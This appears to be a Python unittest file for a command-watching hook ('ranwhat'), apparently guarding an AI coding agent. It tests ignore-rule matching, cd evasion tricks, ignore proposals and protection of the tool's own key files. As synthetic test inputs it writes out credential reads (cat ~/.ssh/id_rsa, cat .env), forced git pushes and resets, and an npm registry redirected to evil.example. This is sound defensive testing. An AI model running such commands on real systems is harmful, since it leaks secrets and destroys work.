"""Gaps the second review round found in how an entry is matched, how a cd is
followed, what a proposal writes, and which paths the hook asks about
(watch.py, ignore.py). Every value here is synthetic.
"""
import datetime
import os
import sys
import unittest

TESTS = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(TESTS))
sys.path.insert(0, TESTS)

import isolated_home  # noqa: E402,F401  ranwhat's state, never ~/.ranwhat
from ranwhat import hook, ignore, watch  # noqa: E402
from test_ignore_policy import MYLIB, TODAY, hidden, judged  # noqa: E402

PUBLISH = "publish 'npm publish' in=~/work/mylib until=2027-01-31"


class LaterCommandWins(unittest.TestCase):
    def test_an_earlier_command_of_the_rule_is_not_left_out_with_the_later(self):
        cases = (
            ("cred.read 'cat .env' in=~/work/mylib until=2027-01-31",
             "cat ~/.ssh/id_rsa && cat .env"),
            ("cred.read 'cat .env' in=~/work/mylib until=2027-01-31",
             "cat .env && cat ~/.ssh/id_rsa"),
            ("git.destructive 'git push --force origin main'",
             "git reset --hard && git push --force origin main"))
        for entry, command in cases:
            with self.subTest(command=command):
                rec = judged(command, MYLIB)
                self.assertFalse(hidden(entry, rec))
                self.assertTrue(hidden(rec["id"], rec))
        # the one command alone is still left out
        self.assertTrue(hidden("git.destructive 'git push --force origin main'",
                               judged("git push --force origin main", MYLIB)))

    def test_it_says_so_on_the_hit(self):
        hit = watch.evaluate("Bash", {"command": "cat ~/.ssh/id_rsa && cat .env"},
                             subjects=True)[0][0]
        self.assertTrue(hit.get("_several"))


class CdBehindManyWords(unittest.TestCase):
    def test_a_cd_the_shell_runs_but_the_text_hides_is_not_in_the_folder(self):
        assigns = " ".join("A%d=1" % i for i in range(12))
        for command in (
                assigns + " cd /tmp/evil && npm publish",
                "A0=1 A1=1 A2=1 A3=1 A4=1 A5=1 A6=1 A7=1 A8=1 A9=1 A10=1 A11=1 A12=1 "
                "cd /tmp/evil && npm publish",
                "! " * 12 + "cd /tmp/evil && npm publish",
                "time " * 12 + "cd /tmp/evil && npm publish",
                "command -p cd /tmp/evil && npm publish",
                "command -- cd /tmp/evil && npm publish",
                "builtin -- cd /tmp/evil && npm publish",
                "f(){ cd /tmp/evil; }; f; npm publish",
                "function f { cd /tmp/evil; }; f; npm publish",
                "c\\\nd /tmp/evil; npm publish",
                "trap 'cd /tmp/evil' DEBUG; npm publish",
                "cd(){ builtin cd /tmp/evil; }; cd /home/dev/app; npm publish"):
            with self.subTest(command=command):
                self.assertFalse(hidden(PUBLISH, judged(command, MYLIB)))
        # a short prefix and a plain command still follow the cd, or none
        self.assertTrue(hidden(PUBLISH, judged("command -p ls && npm publish", MYLIB)))


class Proposals(unittest.TestCase):
    def record(self, subject, rule="fs.destructive"):
        return {"cwd": "/home/dev/app", "hits": [{
            "rule": rule, "severity": "high", "_on": "command",
            "_subject": subject, "_cd": ""}]}

    def test_other_windows_paths_are_not_written_into_an_entry(self):
        for command in (r"rm -rf data\old", r"rm -rf .\build", r"rm -rf $HOME\data"):
            with self.subTest(command=command):
                found, why = ignore.proposal(self.record(command), TODAY)
                self.assertIsNone(found)
                self.assertIn("Windows path", why)
        # a POSIX escape is no Windows path
        self.assertIsNotNone(ignore.proposal(self.record(r"rm -rf my\ dir"), TODAY)[0])

    def test_a_literal_star_is_not_made_a_wildcard(self):
        found, why = ignore.proposal(self.record("rm -rf /home/dev/app/*"), TODAY)
        self.assertIsNone(found)
        self.assertIn("wildcard", why)
        self.assertIsNotNone(ignore.proposal(self.record("rm -rf /home/dev/app/x"),
                                             TODAY)[0])


class CasesAndSlashes(unittest.TestCase):
    def test_the_same_files_in_another_case_are_ranwhats_own(self):
        home = os.path.expanduser("~")
        for path in (home + "/.ranwhat/Ignore", home + "/.ranwhat/IGNORE",
                     "C:\\Users\\a\\.RANWHAT\\IGNORE",
                     home + "/.ranwhat/known/KEPT.JSON",
                     home + "/.ranwhat/known/Key",
                     home + "/.ranwhat/Known/kept.json"):
            with self.subTest(path=path):
                self.assertEqual(watch._config_kind(path)[0], "ranwhat")
                decision, _why = hook.decide("Write", {"file_path": path,
                                                       "content": "x"})
                self.assertEqual(decision, "ask")
        for command in ("echo x >> ~/.ranwhat/IGNORE",
                        "echo x > ~/.ranwhat/known/KEPT.JSON",
                        "echo x > ~/.ranwhat/KNOWN/key"):
            with self.subTest(command=command):
                self.assertEqual(hook.decide("Bash", {"command": command})[0], "ask")

    def test_a_doubled_slash_or_dot_in_a_read_of_the_key_is_seen(self):
        for command in ("cat ~/.ranwhat//known/key", "cat ~/.ranwhat/known/./key",
                        "cat /root/.ranwhat/known//key", "cat ~/.ranwhat//token",
                        "cat $RANWHAT_HOME//known/key"):
            with self.subTest(command=command):
                self.assertEqual(hook.decide("Bash", {"command": command})[0], "ask")
        self.assertEqual(hook.decide("Bash", {"command": "cat ~/.ranwhat/ignore"}),
                         (None, ""))


class StateSetEarlier(unittest.TestCase):
    def test_an_entry_sees_one_command_and_the_readme_says_so(self):
        # Pinned, not fixed: the words of one command are what an entry
        # matches (README, "What is never left out").
        self.assertTrue(hidden(PUBLISH, judged(
            "export npm_config_registry=http://evil.example; npm publish", MYLIB)))
        with open(os.path.join(os.path.dirname(TESTS), "README.md"),
                  encoding="utf-8") as f:
            self.assertIn("by its id than by a pattern", f.read())


if __name__ == "__main__":
    unittest.main()
